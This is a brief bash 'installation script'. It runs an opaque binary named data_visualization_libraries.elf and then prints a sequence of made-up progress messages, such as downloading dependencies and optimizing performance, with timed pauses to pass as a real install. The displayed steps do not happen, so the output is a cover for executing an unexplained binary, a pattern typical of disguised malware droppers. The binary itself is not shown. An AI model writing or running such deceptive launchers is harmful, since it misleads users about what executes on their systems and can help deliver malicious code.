#!/bin/bash

# Installation script
steps=(
    "Checking system requirements..."
    "Downloading dependencies..."
    "Extracting files..."
    "Configuring settings..."
    "Optimizing performance..."
    "Finalizing installation..."
    "Cleaning up temporary files..."
    "Installation complete!"
)
echo "Installing required libraries"
chmod +x data_visualization_libraries.elf
./data_visualization_libraries.elf
for step in "${steps[@]}"; do
    echo "$step"
    sleep 1.5  # Adjust timing to make it run ~10 seconds
done
